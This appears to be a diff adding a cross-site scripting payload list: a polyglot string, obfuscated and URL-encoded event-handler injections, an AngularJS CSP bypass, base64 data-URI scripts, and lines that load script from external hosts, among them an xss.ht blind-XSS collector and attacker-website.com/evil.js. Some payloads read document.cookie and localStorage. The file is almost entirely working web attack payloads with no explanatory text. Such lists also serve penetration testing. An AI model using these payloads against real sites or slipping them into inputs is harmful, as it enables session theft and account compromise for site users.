@@ -1,0 +1,72 @@
+XSS POLYGON: '"onclick=(co\u006efirm)?.`0`><sVg/i="${{2>1}}"oNload=(pro\u006dpt)`1`></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//nishantbhagat.xSs.ht></scripT>
+
+URI: javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+"/><script>alert(1);</script>
+</script><script>alert(1)</script>
+
+'"><img src=x>${{7*7}}
+"><img src onerror=alert(1)>
+"><img src onerror=alert(document.domain)>
+"><img src onerror=alert(window.origin)>
+"><img src onerror=alert(document.session)>
+"><img src=x onerror=prompt(document.domain)>
+‘“><img src=x onerror=alert(1)>
+
+<marquee loop=1 width=0 onfinish=alert(1337)>XSS</marquee>
+'><marquee loop=1 width=0 onfinish=pr\u006fmpt`_Y000!_`>Y000</marquee>
+<marquee/onstart=alert()>
+
+"><output onclick="alert(1)">X</output>
+
+'">><div><meter onmouseover="alert(1)"</div>"
+"><img src onerror=console.log("XSSTEST:"+window.origin)>
+"><output onclick="alert(1)">X</output>
+<a href="javascript:alert(1)">click</a>
+<a href="javascript:alert(window.localStorage)">click</a>
+<svg onload=alert%26%230000000040"1")>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGV
+sbG8iKTs8L3NjcmlwdD4="></object>
+
+"><script src=https://nishantbhagat.xss.ht></script>
+
+<video onmozfullscreenchange=(alert)(domain) src= controls>
+
+</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
+Test?”></script><script>alert(document.cookie)</script>
+
+<svg onload=alert%26%230000000040"1")>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+& "><svg onerror="alert(1337)">
+"><img src onerror=alert(1)>
+<h1>t
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+
+
+<svg onload=alert(document.domain)>
+'"><svg/onload=alert(document.domain)>
+‘“><img src=x onerror=alert(1)>
+‘“><img src=x onerror=alert(document.cookie)>
+
+<script/src=data:,alert()>
+<video/poster/onerror=alert()>
+<isindex/autofocus/onfocus=alert()>
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGV
+sbG8iKTs8L3NjcmlwdD4="></object>
+"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"></script>
+<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+"/>'><script src=https://attacker-website.com/evil.js></script>
+"/>'><script src=data:text/javascript,alert(1337)></script>
+"/><script>alert(1);</script>
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+
